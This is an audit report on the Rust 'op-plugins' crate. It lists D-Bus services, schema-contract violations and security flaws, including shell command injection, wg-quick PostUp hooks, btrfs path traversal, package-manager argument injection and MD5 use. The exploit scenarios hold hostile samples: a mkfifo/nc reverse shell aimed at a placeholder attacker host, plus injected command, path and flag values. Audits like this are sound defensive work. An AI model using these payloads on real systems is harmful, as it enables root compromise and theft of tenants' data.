# Production Security and Quality Audit: `op-plugins`

---

## Section 1: Integration & Architectural Review

### 1. Crates Depending on `op-plugins`
Based on the provided workspace `Cargo.toml`, the following crate explicitly depends on `op-plugins`:
* **`op-dbus`** (root package defined in `Cargo.toml`)

*Note: The workspace contains 34 members (e.g., `op-services`, `op-mcp`, etc.). Since their individual `Cargo.toml` files are not provided, we cannot definitively list which of those members depend on `op-plugins` under the strict citation rule.*

### 2. Registered D-Bus Service Names & Object Paths
The codebase registers and/or interacts with the following D-Bus service names and object paths:

#### Registered (Exposed) by this Crate:
* **Service Name:** `org.opdbus.v1` *(via `registry.rs:103`)*
* **Object Path:** `/org/opdbus/v1/plugins/{plugin_name}` *(sanitized via `registry.rs:173-178`)*

#### Consumed (Called) by Crate Plugins:
* **Systemd / Dinit Integration:**
  * Service: `org.chimera.dinit` | Path: `/org/chimera/dinit` | Interface: `org.chimera.dinit.Manager` *(via `state_plugins/dinit.rs:35-39`, `state_plugins/service.rs:53-57`)*
  * Service: `org.freedesktop.systemd1` | Path: `/org/freedesktop/systemd1` | Interface: `org.freedesktop.systemd1.Manager` *(via `state_plugins/systemd.rs:51-56`, `state_plugins/systemd_networkd.rs:140-145`)*
  * Service: `org.freedesktop.systemd1` | Path: `/org/freedesktop/systemd1/unit/systemd_2dnetworkd_2eservice` | Interface: `org.freedesktop.systemd1.Unit` *(via `state_plugins/systemd_networkd.rs:104-109`)*
* **Systemd-Login1 Integration:**
  * Service: `org.freedesktop.login1` | Path: `/org/freedesktop/login1` | Interface: `org.freedesktop.login1.Manager` *(via `state_plugins/login1.rs:34-39`)*
* **Secret Service Integration:**
  * Service: `org.freedesktop.secrets` | Path: `/org/freedesktop/secrets` | Interface: `org.freedesktop.Secret.Service` *(via `state_plugins/keyring.rs:58-63`)*
  * Service: `org.freedesktop.secrets` | Path: `{dynamic_collection_path}` | Interface: `org.freedesktop.Secret.Collection` *(via `state_plugins/keyring.rs:79-84`)*
* **PackageKit Integration:**
  * Service: `org.freedesktop.PackageKit` | Path: `/org/freedesktop/PackageKit` | Interface: `org.freedesktop.PackageKit` *(via `state_plugins/packagekit.rs:16-20`)*
  * Service: `org.freedesktop.PackageKit` | Path: `{dynamic_transaction_path}` | Interface: `org.freedesktop.PackageKit.Transaction` *(via `state_plugins/packagekit.rs:32-35`)*
* **Network1 Integration:**
  * Service: `org.freedesktop.network1` | Path: `/org/freedesktop/network1` | Interface: `org.freedesktop.network1.Manager` *(via `state_plugins/systemd_networkd.rs:121-126`)*

### 3. HTTP / gRPC Endpoints Exposed
No HTTP or gRPC servers are started directly within the provided `op-plugins` crate source files. However:
* `McpStatePlugin` *(via `state_plugins/mcp.rs`)* supports configuring external MCP servers using HTTP/SSE transports.
* `PrivacyRouterPlugin` *(via `state_plugins/privacy_router.rs`)* probes and communicates with an external OpenFlow controller endpoint configured via `PRIVACY_OPENFLOW_CONTROLLER` (defaulting to `10.200.0.1:6653`).

### 4. Cross-Crate Circular Dependency Risks
The workspace `Cargo.toml` shows that `op-dbus` depends directly on both `op-plugins` and its individual component crates (such as `op-network`, `op-state`, and `op-state-store`).
* **Risk:** `op-plugins` depends directly on `op-core`, `op-dbus-model`, `op-state`, `op-state-store`, `op-snowball`, `op-network`, `op-dynamic-loader`, and `op-execution-tracker` *(via `Cargo.toml:10-17`)*.
* If any of these lower-level state or network crates attempt to reference or deserialize types directly from `op-plugins` (rather than keeping abstract interfaces in `op-state` / `op-core`), a circular dependency compilation failure will occur. Architectural boundaries must be strictly maintained.

---

## Section 2: Schema-As-Code Violations

The codebase has committed to a schema-as-code discipline using Protocol Buffers and OSCAL. However, several critical data contracts are expressed as ad-hoc Rust structs, raw JSON objects, or untyped D-Bus tuples:

### 1. Ad-hoc Chat / LLM Contract Serialization
* **Location:** `crates/op-plugins/src/chat.rs:12-74`
* **Violation:** The `ChatMessage`, `ToolCall`, `ChatRequest`, and `ChatResponse` structures are declared as ad-hoc Serde/Rust types. These core LLM interaction contracts should be generated from versioned Protocol Buffer definitions to ensure cross-language compatibility and backward-compatible evolution.

### 2. Untyped D-Bus Tuple Contracts
* **Location:** `crates/op-plugins/src/state_plugins/dinit.rs:12-25` and `crates/op-plugins/src/state_plugins/service.rs:32-44`
* **Violation:** Complex system statuses are represented as untyped Rust tuples (`type DinitServiceRecord = (String, String, String, String, String, DinitFlags, u32, i32, i32)`). Changes in the dinit D-Bus interface will silently break deserialization without schema validation or version checks.

### 3. Dynamic Unvalidated JSON Payload Inputs
* **Location:** `crates/op-plugins/src/auto_create.rs:24-34`
* **Violation:** The autodiscover system generates ad-hoc JSON payloads using untyped macro constructs (`json!({ "type": "systemd", "name": unit, "state": "active", "enabled": true })`) rather than instantiating statically typed, versioned structs defined in the schema catalog.

---

## Section 3: Security & Quality Audit Findings

### CRITICAL: Remote Code Execution (RCE) via Shell Command Injection in `pcidecl`
* **Location:** `crates/op-plugins/src/state_plugins/pcidecl.rs:91-100`
* **Impact:** Arbitrary Command Execution as Root.
* **Description:** The `lspci_present` helper accepts a reference to a PCI address string (`addr`) obtained directly from the user-controlled desired state configuration without validation. It interpolates this string into a shell command and executes it using `sh -c`:
  ```rust
  fn lspci_present(addr: &str) -> bool {
      if let Ok(out) = Command::new("sh")
          .arg("-c")
          .arg(format!("lspci -s {} >/dev/null 2>&1; echo $?", addr))
          .output()
  ```
* **Exploit Scenario:** An attacker pushing a desired state containing `address = "0000:00:1f.6; touch /tmp/powned ;"` triggers arbitrary code execution on the host system.
* **Remediation:** Remove the `sh -c` wrapper entirely. Execute `/usr/bin/lspci` directly using safe vector-based arguments:
  ```rust
  Command::new("lspci").args(["-s", addr]).output()
  ```

---

### CRITICAL: Remote Code Execution (RCE) via `wg-quick` Command Injection in `privacy_router`
* **Location:** `crates/op-plugins/src/state_plugins/privacy_router.rs:462-510`
* **Impact:** Privilege Escalation / Arbitrary Command Execution as Root.
* **Description:** The `PrivacyRouterPlugin` executes `/usr/bin/wg-quick` with a user-supplied configuration file path (`config_path`) sourced from the desired state:
  ```rust
  async fn ensure_wg_quick_interface(&self, name: &str, config_path: &str) -> Result<()> {
      self.validate_wg_quick_config(name, config_path)?;
      self.run_command("/usr/bin/wg-quick", &["up", config_path])
  ```
  While the plugin performs validation in `validate_wg_quick_config`, it only checks for the presence of `[Interface]`, `PrivateKey`, and `Table = off`. It **does not** filter or block execution-related directives such as `PostUp`, `PreUp`, `PostDown`, or `PreDown` inside the configuration file.
* **Exploit Scenario:** An attacker writes a malicious configuration file to `/tmp/evil.conf` containing:
  ```ini
  [Interface]
  PrivateKey = d090...
  Table = off
  PostUp = rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker_ip> <port> >/tmp/f
  ```
  Setting the `wgcf_config` parameter in the desired state to `/tmp/evil.conf` forces `wg-quick` to execute the `PostUp` payload as `root`.
* **Remediation:** Strictly validate the contents of any WireGuard configuration files before executing `wg-quick`, or explicitly forbid and strip all script execution hooks (`PreUp`, `PostUp`, `PreDown`, `PostDown`) from the configuration.

---

### CRITICAL: Arbitrary BTRFS Subvolume Access / Information Disclosure in `lxc`
* **Location:** `crates/op-plugins/src/state_plugins/lxc.rs:405-430`
* **Impact:** Bypass of Container/Tenant Isolation and Unauthorized Host File Access.
* **Description:** The `create_container_from_btrfs_snapshot` function utilizes user-supplied parameters (`storage` and `golden_image_name`) from the desired state to construct path variables without validating them against path traversal patterns:
  ```rust
  let storage = props.and_then(|p| p.get("storage")).and_then(|v| v.as_str()).unwrap_or("local-btrfs");
  ...
  let storage_path = format!("/var/lib/pve/{}", storage);
  let golden_image_path = format!("{}/templates/subvol/{}", storage_path, golden_image_name);
  ```
  The resulting path is subsequently passed directly to the `btrfs` snapshot utility:
  ```rust
  let snapshot_output = tokio::process::Command::new("btrfs")
      .args(["subvolume", "snapshot", &golden_image_path, &container_rootfs])
  ```
* **Exploit Scenario:** An attacker can perform a directory traversal attack by setting `golden_image_name` to `../../images/101/rootfs` (representing another tenant's container root file system). This forces `btrfs` to snapshot the victim container's filesystem into the attacker's own directory space, exposing all private data and keys.
* **Remediation:** Implement strict sanitization on `storage` and `golden_image_name`. Restrict names to alphanumeric characters, dashes, and underscores to prevent path traversal (`..` and `/`).

---

### HIGH: Argument Injection in `PackageKitPlugin`
* **Location:** `crates/op-plugins/src/state_plugins/packagekit.rs:114-142`
* **Impact:** Arbitrary Package Installation, File Overwrites, or Configuration Poisoning.
* **Description:** Unvalidated package names (`resource`) are passed directly as arguments to host package managers:
  ```rust
  async fn install_via_direct(&self, package_name: &str) -> Result<()> {
      if Command::new("apt-get")
          .args(["install", "-y", package_name])
  ```
  If the package manager used is `pacman` (Arch):
  ```rust
  Command::new("pacman")
      .args(["-S", "--noconfirm", package_name])
  ```
* **Exploit Scenario:** If a package name is formatted as `--config=/tmp/malicious.conf`, `pacman` will interpret this as a flag argument rather than a package name, resulting in arbitrary configuration loading.
* **Remediation:** Sanitize package names to ensure they do not start with a hyphen (`-`) and conform to strict alphanumeric naming conventions for standard packages.

---

### MEDIUM: Use of Cryptographically Broken Hashing Algorithm (MD5) for Verification and State Hashing
* **Locations:**
  * `crates/op-plugins/src/auto_create.rs:105-106`
  * `crates/op-plugins/src/state_plugins/config.rs:159-160`
  * `crates/op-plugins/src/state_plugins/dnsresolver.rs:188-196`
  * `crates/op-plugins/src/state_plugins/incus.rs:434-435`
  * `crates/op-plugins/src/state_plugins/keyring.rs:172-173`
  * `crates/op-plugins/src/state_plugins/login1.rs:72-73`
* **Impact:** Cryptographic Hash Collisions in Audit Trails.
* **Description:** The system utilizes MD5 to calculate state hashes for diffs and verification tracking (`md5::compute(...)`). Since MD5 is highly vulnerable to collision attacks, attackers could craft distinct states that yield identical MD5 hashes, compromising snowball audit trail integrity and allowing unauthorized state mutations to go unnoticed.
* **Remediation:** Replace all instances of `md5::compute` with `sha2::Sha256` hashing (which is already imported and used elsewhere in the codebase).